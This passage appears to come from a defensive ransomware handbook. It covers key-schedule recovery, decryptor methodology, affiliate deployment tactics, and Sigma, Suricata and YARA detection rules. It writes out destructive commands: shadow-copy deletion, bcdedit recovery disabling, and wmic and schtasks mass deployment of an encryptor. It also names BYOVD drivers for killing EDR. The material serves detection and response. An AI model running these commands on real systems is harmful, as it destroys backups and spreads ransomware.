        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
    ]
    for i in range(len(data) - 240):
        # Check if bytes at position i could be a valid AES-256 key schedule
        # by verifying the first round key expansion
        w = [struct.unpack('>I', data[i+j*4:i+j*4+4])[0] for j in range(8)]
        # Compute expected w[8] from w[0..7]
        temp = w[7]
        temp_bytes = temp.to_bytes(4, 'big')
        # RotWord + SubWord + Rcon
        rotated = temp_bytes[1:] + temp_bytes[:1]
        subbed = bytes(aes_sbox[b] for b in rotated)
        expected = struct.unpack('>I', subbed)[0] ^ (rcon[0] << 24) ^ w[0]
        actual = struct.unpack('>I', data[i+32:i+36])[0]
        if expected == actual:
            candidates.append(i)
    return candidates
```

#### 5.8.3 Encrypted File Header Parsing

Each ransomware family appends or prepends metadata to encrypted files in a characteristic format. This metadata typically includes the RSA-encrypted per-file key, encryption mode flags, and the original file size. Parsing these headers enables family identification and key recovery assessment.

LockBit 3.0 appends a footer to each encrypted file containing: a 256-byte RSA-encrypted blob (the AES key encrypted with the build's RSA public key), a 4-byte file size marker, and a 16-byte magic value that varies per build. The footer structure can be parsed to extract the encrypted key material for offline analysis.

BlackCat/ALPHV embeds its configuration as a JSON structure encrypted with a per-build AES key. The key is passed as a command-line argument (`--access-token`) and is required for the encryptor to run. If the access token is recovered from endpoint logs (process creation events with full command-line logging), the configuration can be decrypted to reveal target file extensions, kill-list processes, and network propagation settings.

```bash
# CyberChef recipe for extracting ALPHV/BlackCat configuration
# 1. From Raw hex of the binary, search for the JSON config offset
# 2. Apply AES Decrypt (CBC, key from --access-token, IV from first 16 bytes of config blob)
# 3. Gunzip (config is gzip-compressed after encryption)
# CyberChef recipe string:
# From_Hex('None')
# AES_Decrypt({'option':'Hex','string':'<access_token_hex>'},{'option':'Hex','string':'<iv_hex>'},'CBC','Raw','Raw')
# Gunzip()
```

#### 5.8.4 Decryptor Development Methodology

When a cryptographic weakness is identified (as in the Rhysida case described in §5.7), developing a working decryptor requires: (1) confirming the weakness is exploitable at scale (not just for a single file), (2) recovering the seed or key material for each encrypted file, (3) reimplementing the decryption routine in a clean-room environment, and (4) validating against known file formats that the decrypted output matches expected structure (PDF headers, Office document signatures, JPEG SOI markers).

The general approach is to reverse-engineer the encryptor binary (using Ghidra, IDA Pro, or Binary Ninja) to identify the key generation routine, the encryption function, and the file metadata format. If the key generation uses a weak PRNG (like Rhysida's `rand()` seeded with system time), the key space is small enough to brute-force. If the implementation reuses an IV or nonce (a violation of the AES-CTR or ChaCha20 security requirements), the keystream can be recovered by XORing known-plaintext headers with the encrypted output.

Organizations should check No More Ransom (nomoreransom.org), the ID Ransomware service, and vendor-specific decryptor repositories (Emsisoft, Avast, Kaspersky, Bitdefender) before investing IR resources in custom decryptor development. For campaign-specific decryptor availability and per-family IoC signatures, see §domain29B.

---

## 6. Pre-Encryption Preparation and the Deployment Phase

The deployment phase—when the affiliate pushes the encryptor across the environment—is the noisiest and most detectable phase of the attack. It is also the phase where the damage occurs, making rapid detection and response critical.

### 6.1 Disabling Defenses

Before deploying the encryptor, affiliates systematically disable defensive controls:

**EDR/AV tampering** — Uninstalling or disabling endpoint security products. Methods include:
- Using the product's own uninstall command with extracted administrative credentials (many EDR products can be uninstalled by a local or domain admin without a tamper protection code)
- Using BYOVD (Bring Your Own Vulnerable Driver)—loading a legitimately signed but vulnerable kernel driver to terminate the EDR's kernel-mode components. Commonly abused drivers include `Zemana AntiMalware` driver (CVE-2021-31728), `Process Explorer` driver (procexp.sys), and the `AuKill` tool that abuses the Process Explorer driver. LockBit and Black Basta affiliates have used BYOVD extensively. See Domain 11 Chapter 11B §4 for detailed BYOVD mechanics.
- Using `GMER`, `PowerTool`, or custom tools to terminate EDR processes from kernel mode
- Using group policy to push an EDR exclusion configuration or disable real-time monitoring

Detection: Monitor for EDR agent health. If the EDR agent on a host stops reporting, that silence is itself an alert. Implement "canary" processes or heartbeat monitoring that are independent of the EDR and alert when the EDR agent is unresponsive. Monitor for loading of known vulnerable drivers (maintain a blocklist of vulnerable driver hashes and enforce driver signing policies via WDAC/HVCI).

**Backup destruction** — Deleting or encrypting backup infrastructure is a critical affiliate objective. Methods include:
- Deleting Volume Shadow Copies (`vssadmin delete shadows /all /quiet` or `wmic shadowcopy delete`)
- Disabling the Volume Shadow Copy service (`sc config VSS start= disabled`)
- Identifying and destroying Veeam backup repositories (Veeam is the most commonly targeted backup solution). Affiliates query the Veeam SQL database to enumerate backup repository locations, then encrypt or delete the backup files. CVE-2023-27532 (Veeam Backup & Replication credential disclosure) has been exploited to gain access to the Veeam server.
- Destroying Linux-based backup targets (NFS/iSCSI shares, Synology/QNAP NAS devices) by SSH'ing in with harvested credentials
- Deleting cloud backup retention policies or cloud snapshots if the affiliate has obtained cloud administrative credentials

Architectural defense: Immutable backups are the single most effective ransomware mitigation. Backups stored in a system that enforces retention policies that cannot be overridden by any single administrator (e.g., AWS S3 Object Lock in Compliance mode, air-gapped tape, or backup appliances with immutable snapshot capabilities) cannot be deleted by the attacker even if they have domain admin and backup system administrative credentials.

**Disabling Windows recovery** — `bcdedit /set {default} recoveryenabled No`, `bcdedit /set {default} bootstatuspolicy ignoreallfailures`, and deletion of the Windows Recovery Environment partition prevent victims from using built-in recovery mechanisms.

### 6.2 Deployment Mechanisms

**Group Policy deployment** — The affiliate creates or modifies a GPO to deploy the encryptor via a scheduled task, logon script, or software installation. When the GPO is applied (on the next Group Policy refresh cycle, typically within 90 minutes, or forced via `gpupdate /force`), every machine in the GPO's scope executes the encryptor. This is the most common mass-deployment mechanism.

Detection: Monitor for GPO modifications (Event IDs 5136, 5137 in the Directory Service log on domain controllers). Alert on GPO changes that add scheduled tasks or logon scripts, especially outside change management windows.

**PsExec mass deployment** — The affiliate scripts PsExec to iterate over a list of target hostnames and deploy the encryptor to each. This is faster than GPO (no waiting for refresh cycles) but noisier (creates a service on each target, generates Event ID 7045).

**WMI-based deployment** — `wmic /node:@targets.txt process call create "C:\Windows\Temp\encryptor.exe"` provides remote execution without installing services, but requires WMI access (port 135/RPC and DCOM).

**SMB deployment with scheduled task creation** — The affiliate copies the encryptor to the target's `C$` or `ADMIN$` share, then creates a scheduled task via `schtasks /create /s <target> /ru SYSTEM /tn <taskname> /tr "C:\Windows\Temp\encryptor.exe" /sc once /st 00:00` to execute it.

**ESXi deployment** — For VMware environments, the affiliate typically SSHs into the ESXi host (using harvested credentials or after enabling SSH if it was disabled), stops all running VMs, and runs the Linux encryptor directly on the datastore. Some affiliates use the vCenter management interface to push the encryptor to multiple ESXi hosts.

Detection: The common thread across all deployment mechanisms is the mass execution of an unknown binary across many hosts in a short time window. Endpoint telemetry should flag: (a) execution of unsigned or newly seen binaries across multiple hosts, (b) process creation events where the parent is PsExec service, WMI provider, or Task Scheduler, and (c) rapid sequential process creation events across many hosts from a single source account.

---

## 7. Detection Strategy: Mapping the Kill Chain to Telemetry

Effective ransomware detection is not about catching the encryptor—by that point, the damage is imminent or underway. Effective detection catches the affiliate during the earlier phases, when they are establishing persistence, harvesting credentials, and moving laterally. This section maps each kill chain phase to the specific telemetry sources and detection logic required.

### 7.1 Telemetry Requirements

At minimum, an enterprise defending against ransomware must collect and centralize:

**Endpoint telemetry:** Process creation events with full command-line logging (Sysmon Event ID 1 or EDR equivalent), file creation/modification events (Sysmon Event ID 11), network connection events (Sysmon Event ID 3), registry modification events (Sysmon Event ID 13), driver loading events (Sysmon Event ID 6), WMI events (Sysmon Event IDs 19-21), and DNS queries (Sysmon Event ID 22). PowerShell script block logging (Event ID 4104) is essential for detecting encoded/obfuscated PowerShell commands.

**Authentication telemetry:** Windows Security Event IDs 4624 (successful logon), 4625 (failed logon), 4648 (explicit credential logon), 4768 (TGT request), 4769 (TGS request), 4771 (Kerberos pre-authentication failure). Active Directory change logs: Event IDs 4662 (directory service access, critical for DCSync detection), 5136 (directory object modification, critical for GPO tampering detection).

**Network telemetry:** DNS query logs (from DNS servers or network taps), web proxy logs with full URL and response size, NetFlow data from core network switches, firewall session logs with per-session byte counts (critical for exfiltration volume detection), and IDS/IPS alerts (Suricata/Snort/Zeek).

**Cloud and SaaS telemetry:** Azure AD/Entra ID sign-in logs (including conditional access evaluation results), AWS CloudTrail, GCP Audit Logs, Microsoft 365 Unified Audit Log, and SaaS application access logs.

**Backup and infrastructure telemetry:** Veeam backup job logs, VMware vCenter event logs (VM power state changes, SSH enablement), ESXi host logs, and storage array snapshot retention events.

### 7.2 Detection Logic by Kill Chain Phase

**Initial access — Appliance exploitation:**
- Sigma rule: `Process creation on VPN/firewall appliance where parent process is the web server (nginx, Apache, httpd) and child process is a shell (/bin/sh, /bin/bash, cmd.exe)`. This detects command injection exploitation.
- Network rule: `Outbound connection from management IP of network appliance to external IP on non-standard ports`.
- Appliance integrity: `Hash comparison of appliance filesystem against known-good baseline fails`.

**Initial access — Stolen credentials:**
- Impossible travel: `User authenticates from two geographic locations more than 500 miles apart within less than 60 minutes`.
- VPN anomaly: `VPN session initiated by user from IP address not seen in the user's authentication history in the past 90 days, from an ASN associated with VPN/proxy services`.
- Credential stuffing: `More than 10 failed authentication attempts against distinct user accounts from the same source IP within 5 minutes`.

**Persistence — RMM tools:**
- `Process creation where image filename matches known RMM tools (AnyDesk, Splashtop, Atera, Level, ConnectWise ScreenConnect) AND the image is not in the approved software inventory`.

**Reconnaissance — AD enumeration:**
- `LDAP query volume from a single source exceeds 1,000 queries in 10 minutes AND the queries include objectClass=user, objectClass=group, objectClass=computer, and objectClass=trustedDomain`. This detects SharpHound/BloodHound collector activity.

**Credential harvesting — LSASS access:**
- `Process access event (Sysmon Event ID 10) where target process is lsass.exe AND source process is not an expected security tool (AV, EDR) AND requested access includes PROCESS_VM_READ (0x0010)`.
- `Process creation where command line contains comsvcs.dll AND MiniDump`.
- `File creation where file name matches pattern lsass*.dmp or lsass*.zip`.

**Credential harvesting — DCSync:**
- `Event ID 4662 where properties include DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All AND the subject is not a domain controller computer account`.

**Lateral movement:**
- `Event ID 4624 Type 3 (network logon) with elevated privileges (admin group membership) from a source workstation to a server, where this source-destination pair has not been observed in the baseline period`.
- `Event ID 7045 (new service) where the service binary path contains a temp directory or has a random-looking filename`.

**Exfiltration:**
- `Web proxy log: outbound transfer to cloud storage domain (mega.nz, api.mega.co.nz, content.dropboxapi.com, *.blob.core.windows.net, storage.googleapis.com) exceeds 1 GB in a 24-hour period AND the source host is not an authorized cloud backup or sync client`.
- `Process creation: rclone.exe execution on any host`.

**Defense evasion — EDR tampering:**
- `Driver load event (Sysmon Event ID 6) where driver hash matches known vulnerable driver blocklist (LOLDrivers database)`.
- `EDR agent health heartbeat not received from host for more than 15 minutes`.

**Encryption deployment:**
- `File creation event: more than 100 files with the same new extension (not matching known application extensions) created within 60 seconds on a single host`. This is a high-fidelity ransomware encryption detection but triggers only after encryption has begun.
- `File modification event: more than 100 files across multiple directories have their first 4096 bytes modified and their file entropy increases significantly within 60 seconds`. This detects intermittent encryption.

### 7.3 Sigma Detection Rules by Kill Chain Phase

The prose-based detection logic in §7.2 translates into deployable Sigma rules. Each rule targets a specific kill chain phase and maps to the telemetry sources described in §7.1. Campaign-specific detection rules (e.g., SUNBURST DNS patterns, MOVEit web shell artifacts) are in §domain29B and should be deployed alongside these generic rules.

#### Initial Access — Credential Spraying Detection

Credential spraying produces a pattern of failed logons across many accounts from few source IPs, distinct from brute-force (many attempts against one account). This rule triggers when a single source IP generates failed logons against more than 10 distinct accounts within 5 minutes.

```yaml
title: Credential Spraying Detection via Failed Logons
id: 8a2f3e91-cc40-4d7a-b1e5-ransomware-29a-001
status: stable
description: Detects credential spraying patterns — multiple failed logons to distinct accounts from a single source
references:
    - https://attack.mitre.org/techniques/T1110/003/
author: SOC Engineering
date: 2025-05-08
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4625
        LogonType: 3
    filter_machine_accounts:
        TargetUserName|endswith: '$'
    condition: selection and not filter_machine_accounts | count(TargetUserName) by IpAddress > 10
    timeframe: 5m
falsepositives:
    - Vulnerability scanners with credential testing
    - Legitimate SSO systems during mass password resets
level: high
tags:
    - attack.credential_access
    - attack.t1110.003
```

#### Execution — PsExec Service Installation

PsExec creates a service on the target host. The default service name is `PSEXESVC`, but Impacket and custom tooling use random names. This rule detects both the default and randomized patterns.

```yaml
title: PsExec-Style Remote Service Installation
id: 8a2f3e91-cc40-4d7a-b1e5-ransomware-29a-002
status: stable
description: Detects installation of services characteristic of PsExec or Impacket-psexec lateral movement
references:
    - https://attack.mitre.org/techniques/T1569/002/
author: SOC Engineering
date: 2025-05-08
logsource:
    product: windows
    service: system
detection:
    selection_default:
        EventID: 7045
        ServiceName: 'PSEXESVC'
    selection_random:
        EventID: 7045
        ServiceFileName|contains:
            - '\ADMIN$'
            - '\Windows\Temp\'
            - 'cmd.exe /c'
    selection_impacket:
        EventID: 7045
        ServiceName|re: '^[a-zA-Z]{8}$'
        ServiceFileName|contains: '%COMSPEC%'
    condition: selection_default or selection_random or selection_impacket
falsepositives:
    - Legitimate Sysinternals PsExec usage by IT administrators
level: high
tags:
    - attack.execution
    - attack.t1569.002
    - attack.lateral_movement
    - attack.t1021.002
```

#### Execution — WMI Remote Process Creation

WMI-based execution spawns processes under `wmiprvse.exe`. This rule detects suspicious child processes of the WMI Provider Host that indicate remote command execution.

```yaml
title: Suspicious WMI Remote Process Creation
id: 8a2f3e91-cc40-4d7a-b1e5-ransomware-29a-003
status: stable
description: Detects suspicious process creation via WMI indicating remote execution
references:
    - https://attack.mitre.org/techniques/T1047/
author: SOC Engineering
date: 2025-05-08
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\wmiprvse.exe'
    filter_legitimate:
        Image|endswith:
            - '\WmiPrvSE.exe'
            - '\WmiApSrv.exe'
            - '\svchost.exe'
    condition: selection and not filter_legitimate
falsepositives:
    - Legitimate WMI-based management tools (SCCM, monitoring agents)
level: medium
tags:
    - attack.execution
    - attack.t1047
```

#### Execution — Scheduled Task Creation

Remote scheduled task creation is a primary ransomware deployment mechanism. This rule detects task creation events, with higher severity for tasks running as SYSTEM or targeting multiple hosts.

```yaml
title: Remote Scheduled Task Creation
id: 8a2f3e91-cc40-4d7a-b1e5-ransomware-29a-004
status: stable
description: Detects scheduled task creation that may indicate ransomware deployment staging
references:
    - https://attack.mitre.org/techniques/T1053/005/
author: SOC Engineering
date: 2025-05-08
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4698
    filter_known_tasks:
        TaskName|contains:
            - '\Microsoft\Windows\'
            - '\Microsoft\Office\'
    suspicious_content:
        TaskContent|contains:
            - '.exe'
            - 'cmd.exe'
            - 'powershell'
            - 'Temp'
    condition: selection and not filter_known_tasks and suspicious_content
falsepositives:
    - Legitimate software deployment via SCCM or Intune
level: medium
tags:
    - attack.execution
    - attack.persistence
    - attack.t1053.005
```

#### Credential Access — LSASS Memory Access

Direct LSASS access is the primary credential dumping indicator. This Sysmon-based rule detects process access to LSASS with read permissions from non-standard source processes.

```yaml
title: LSASS Memory Access for Credential Dumping
id: 8a2f3e91-cc40-4d7a-b1e5-ransomware-29a-005
status: stable
description: Detects process access to LSASS that indicates credential dumping (Mimikatz, procdump, comsvcs.dll)
references:
    - https://attack.mitre.org/techniques/T1003/001/
author: SOC Engineering
date: 2025-05-08
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'
            - '0x1410'
            - '0x1FFFFF'
            - '0x1F1FFF'
            - '0x143A'
    filter_known_security:
        SourceImage|endswith:
            - '\MsMpEng.exe'
            - '\csrss.exe'
            - '\wininit.exe'
            - '\wmiprvse.exe'
            - '\svchost.exe'
    condition: selection and not filter_known_security
falsepositives:
    - Legitimate EDR and AV products accessing LSASS for protection
level: critical
tags:
    - attack.credential_access
    - attack.t1003.001
```

#### Credential Access — DCSync Attack

DCSync requests directory replication rights from a non-domain-controller source. This is one of the highest-fidelity detection rules in the ransomware kill chain because legitimate replication requests only originate from domain controllers.

```yaml
title: DCSync Attack — Directory Replication from Non-DC
id: 8a2f3e91-cc40-4d7a-b1e5-ransomware-29a-006
status: stable
description: Detects DCSync attacks by identifying directory replication requests from non-domain-controller accounts
references:
    - https://attack.mitre.org/techniques/T1003/006/
author: SOC Engineering
date: 2025-05-08
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        Properties|contains:
            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
    filter_dc_accounts:
        SubjectUserName|endswith: '$'
        SubjectUserName|contains:
            - 'DC01'
            - 'DC02'
    condition: selection and not filter_dc_accounts
falsepositives:
    - Azure AD Connect (AADConnect) service accounts performing legitimate replication
level: critical
tags:
    - attack.credential_access
    - attack.t1003.006
```

#### Credential Access — Kerberoasting

Kerberoasting requests TGS tickets with RC4 encryption for service accounts. Legitimate applications typically negotiate AES encryption. A single account requesting multiple TGS tickets with RC4 encryption is a strong indicator.

```yaml
title: Kerberoasting — RC4 TGS Requests for Multiple SPNs
id: 8a2f3e91-cc40-4d7a-b1e5-ransomware-29a-007
status: stable
description: Detects Kerberoasting by identifying TGS requests with RC4 encryption for multiple service principal names
references:
    - https://attack.mitre.org/techniques/T1558/003/
author: SOC Engineering
date: 2025-05-08
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'
        Status: '0x0'
    filter_machine:
        ServiceName|endswith: '$'
    condition: selection and not filter_machine | count(ServiceName) by IpAddress > 5
    timeframe: 10m
falsepositives:
    - Legacy applications that only support RC4 Kerberos encryption
level: high
tags:
    - attack.credential_access
    - attack.t1558.003
```

#### Lateral Movement — Remote Service Creation

Remote service creation via `sc.exe` or the SCM RPC interface is a lateral movement indicator when the source and destination hosts are not in an expected administrative relationship.

```yaml
title: Remote Service Creation via SC.EXE
id: 8a2f3e91-cc40-4d7a-b1e5-ransomware-29a-008
status: stable
description: Detects sc.exe creating services on remote hosts — a common ransomware lateral movement technique
references:
    - https://attack.mitre.org/techniques/T1543/003/
author: SOC Engineering
date: 2025-05-08
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\sc.exe'
        CommandLine|contains: 'create'
        CommandLine|contains: '\\'
    condition: selection
falsepositives:
    - Legitimate remote service deployment by IT automation tools
level: high
tags:
    - attack.lateral_movement
    - attack.persistence
    - attack.t1543.003
```

#### Exfiltration — Rclone and Cloud Storage Abuse

Rclone is the most commonly observed exfiltration tool across all ransomware families. Any execution of rclone on a corporate endpoint warrants immediate investigation.

```yaml
title: Rclone Execution — Data Exfiltration Tool
id: 8a2f3e91-cc40-4d7a-b1e5-ransomware-29a-009
status: stable
description: Detects execution of rclone, the primary data exfiltration tool in ransomware operations
references:
    - https://attack.mitre.org/techniques/T1567/002/
author: SOC Engineering
date: 2025-05-08
logsource:
    category: process_creation
    product: windows
detection:
    selection_name:
        Image|endswith:
            - '\rclone.exe'
            - '\rclone'
    selection_args:
        CommandLine|contains:
            - 'copy --'
            - 'sync --'
            - 'move --'
            - ':mega:'
            - ':s3:'
            - ':ftp:'
    selection_config:
        CommandLine|contains: 'rclone.conf'
    condition: selection_name or selection_args or selection_config
falsepositives:
    - Legitimate cloud backup or sync operations using rclone (should be whitelisted by host)
level: critical
tags:
    - attack.exfiltration
    - attack.t1567.002
```

#### Impact — Volume Shadow Copy Deletion

Shadow copy deletion is one of the final pre-encryption actions and a near-certain indicator of imminent ransomware deployment. This rule has extremely low false-positive rates in most environments.

```yaml
title: Volume Shadow Copy Deletion — Ransomware Pre-Encryption
id: 8a2f3e91-cc40-4d7a-b1e5-ransomware-29a-010
status: stable
description: Detects deletion of Volume Shadow Copies, a mandatory pre-encryption step for most ransomware families
references:
    - https://attack.mitre.org/techniques/T1490/
author: SOC Engineering
date: 2025-05-08
logsource:
    category: process_creation
    product: windows
detection:
    selection_vssadmin:
        Image|endswith: '\vssadmin.exe'
        CommandLine|contains|all:
            - 'delete'
            - 'shadows'
    selection_wmic:
        Image|endswith: '\wmic.exe'
        CommandLine|contains|all:
            - 'shadowcopy'
            - 'delete'
    selection_powershell:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
        CommandLine|contains: 'Win32_ShadowCopy'
        CommandLine|contains: 'Delete'
    selection_bcdedit:
        Image|endswith: '\bcdedit.exe'
        CommandLine|contains:
            - 'recoveryenabled No'
            - 'bootstatuspolicy ignoreallfailures'
    condition: selection_vssadmin or selection_wmic or selection_powershell or selection_bcdedit
falsepositives:
    - Legitimate backup software managing shadow copies (very rare for delete operations)
level: critical
tags:
    - attack.impact
    - attack.t1490
```

#### Impact — Windows Event Log Clearing

Event log clearing destroys forensic evidence and is a strong post-encryption indicator when combined with other ransomware TTPs.

```yaml
title: Security Event Log Cleared
id: 8a2f3e91-cc40-4d7a-b1e5-ransomware-29a-011
status: stable
description: Detects clearing of the Security event log — common ransomware anti-forensics action
references:
    - https://attack.mitre.org/techniques/T1070/001/
author: SOC Engineering
date: 2025-05-08
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 1102
    condition: selection
falsepositives:
    - Legitimate log rotation (rare for Security log, which is managed by retention policies)
level: critical
tags:
    - attack.defense_evasion
    - attack.t1070.001
```

#### Suricata Rules for Ransomware C2 Traffic

Network-level detection complements endpoint rules by identifying C2 callback patterns, exfiltration traffic, and known ransomware infrastructure communication. The following Suricata rules target behavioral patterns rather than specific IoCs (campaign-specific network IoCs are in §domain29B).

```yaml
# Suricata rules for ransomware C2 and exfiltration detection

# Detect Cobalt Strike default JA3 fingerprint (unmodified beacon)
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET TROJAN Cobalt Strike Default JA3 Fingerprint"; ja3.hash; content:"72a589da586844d7f0818ce684948eea"; sid:2029000; rev:1;)

# Detect beacon-like periodic callbacks (fixed interval +/- jitter)
# This requires Suricata's flow tracking — alert on hosts making HTTPS
# connections to the same destination at regular intervals (60s +/- 20s)
alert tls $HOME_NET any -> $EXTERNAL_NET 443 (msg:"POLICY Potential C2 Beacon - Regular HTTPS Callback Interval"; flow:established,to_server; threshold: type both, track by_src, count 10, seconds 600; sid:2029001; rev:1;)

# Detect Rclone traffic to MEGA cloud storage
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"POLICY Rclone to MEGA.nz - Potential Data Exfiltration"; http.host; content:"g.api.mega.co.nz"; sid:2029002; rev:1;)

# Detect large outbound data transfers (>100MB in single flow)
alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"POLICY Large Outbound Data Transfer >100MB"; flow:established,to_server; stream_size:server,>,104857600; sid:2029003; rev:1;)

# Detect DNS queries with high-entropy subdomains (potential DGA or encoded C2)
alert dns $HOME_NET any -> any any (msg:"POLICY High Entropy DNS Subdomain Query"; dns.query; pcre:"/^[a-z0-9]{20,}\./"; sid:2029004; rev:1;)
```

### 7.4 YARA Rules for Ransomware Detection

YARA rules provide file-based and memory-based detection of ransomware binaries, their components, and associated tooling. These rules complement the Sigma behavioral detections and should be deployed at both the endpoint (via EDR YARA scanning) and network (via file inspection proxies) layers.

#### LockBit 3.0 Binary Detection

```
rule LockBit3_Ransomware {
    meta:
        description = "Detects LockBit 3.0 (LockBit Black) ransomware binary"
        author = "Threat Intelligence"
        date = "2025-05-08"
        reference = "https://attack.mitre.org/software/S1052/"
        severity = "critical"
        hash_sample = "80e8defa5571b"
    strings:
        $mutex_pattern = { 47 6C 6F 62 61 6C 5C [4-32] }  // Global\<derived_from_GUID>
        $ransom_note = ".README.txt" ascii wide
        $vss_delete = "vssadmin delete shadows" ascii wide nocase
        $defender_disable = "Set-MpPreference" ascii wide
        $lockbit_str1 = "LockBit" ascii wide
        $lockbit_str2 = "lockbit" ascii
        $api_hash_routine = { 8B ?? 33 ?? C1 ?? 0D 03 }  // CRC-based API hashing loop
        $iocp_pattern = { FF 15 [4] 89 [2] FF 15 [4] }   // IOCP initialization pattern
        $intermittent = { 81 ?? 00 10 00 00 }              // 4KB block size constant
    condition:
        uint16(0) == 0x5A4D and
        filesize < 1MB and
        (
            ($lockbit_str1 or $lockbit_str2) and
            ($vss_delete or $defender_disable) and
            $ransom_note
        ) or
        (
            $api_hash_routine and
            $iocp_pattern and
            $intermittent and
            $mutex_pattern
        )
}
```

#### BlackCat/ALPHV Rust Binary Detection

BlackCat binaries compiled in Rust have distinctive characteristics: the Rust standard library strings, the embedded JSON configuration, and the cross-platform targeting logic.

```
rule ALPHV_BlackCat_Ransomware {
    meta:
        description = "Detects BlackCat/ALPHV ransomware Rust binary"
        author = "Threat Intelligence"
        date = "2025-05-08"
        severity = "critical"
    strings:
        $rust_panic = "panicked at" ascii
        $rust_core = "core::panicking" ascii
        $config_marker = "--access-token" ascii wide
        $esxi_cmd1 = "esxcli vm process" ascii
        $esxi_cmd2 = "esxcli vm process kill" ascii
        $vmdk = ".vmdk" ascii wide
        $vmsn = ".vmsn" ascii wide
        $vmx = ".vmx" ascii wide
        $encrypt_mode1 = "SmartPattern" ascii
        $encrypt_mode2 = "Fast" ascii
        $encrypt_mode3 = "Full" ascii
        $propagation = "psexec" ascii wide
        $note_pattern = "RECOVER-" ascii wide
    condition:
        (uint16(0) == 0x5A4D or uint32(0) == 0x464C457F) and
        $rust_panic and $rust_core and
        (
            ($config_marker and 2 of ($encrypt_mode*)) or
            (2 of ($esxi_cmd*, $vmdk, $vmsn, $vmx)) or
            ($propagation and $note_pattern)
        )
}
```

#### Black Basta Encryption Routine Signatures

```
rule BlackBasta_Ransomware {
    meta:
        description = "Detects Black Basta ransomware binary"
        author = "Threat Intelligence"
        date = "2025-05-08"
        severity = "critical"
    strings:
        $chacha_constant = "expand 32-byte k" ascii
        $readme = "readme.txt" ascii wide nocase
        $basta_icon = { 00 00 01 00 01 00 }  // ICO header for custom skull icon
        $bcdedit_cmd = "bcdedit /set" ascii wide
        $recovery_disable = "recoveryenabled No" ascii wide nocase
        $motd_overwrite = "/etc/motd" ascii  // Linux ESXi variant
        $wallpaper_change = "SystemParametersInfoW" ascii
        $rsa4096_header = { 30 82 02 22 }  // RSA-4096 public key DER prefix
    condition:
        uint16(0) == 0x5A4D and
        $chacha_constant and
        $rsa4096_header and
        (
            ($bcdedit_cmd and $recovery_disable) or
            ($wallpaper_change and $readme) or
            $basta_icon
        )
}
```

#### Generic Ransomware Behavior Indicators

This rule detects behavioral patterns common across ransomware families regardless of specific implementation. It targets ransom note creation patterns, mass file extension modification, and defense evasion commands embedded in the binary.

```
rule Generic_Ransomware_Indicators {
    meta:
        description = "Detects generic ransomware behavioral indicators across families"
        author = "Threat Intelligence"
        date = "2025-05-08"
        severity = "high"
    strings:
        // Ransom note creation patterns
        $note1 = "YOUR FILES ARE ENCRYPTED" ascii wide nocase
        $note2 = "All your files have been encrypted" ascii wide nocase
        $note3 = "DECRYPT" ascii wide
        $note4 = ".onion" ascii wide

        // Shadow copy deletion commands
        $vss1 = "vssadmin delete shadows" ascii wide nocase
        $vss2 = "wmic shadowcopy delete" ascii wide nocase
        $vss3 = "bcdedit" ascii wide

        // Recovery disabling
        $recovery1 = "recoveryenabled" ascii wide nocase
        $recovery2 = "bootstatuspolicy" ascii wide nocase

        // Service/process termination lists
        $kill1 = "taskkill /f /im" ascii wide nocase
        $kill2 = "net stop" ascii wide nocase
        $kill3 = "sc config" ascii wide nocase

        // Encryption indicators
        $crypto1 = "CryptGenRandom" ascii
        $crypto2 = "BCryptEncrypt" ascii
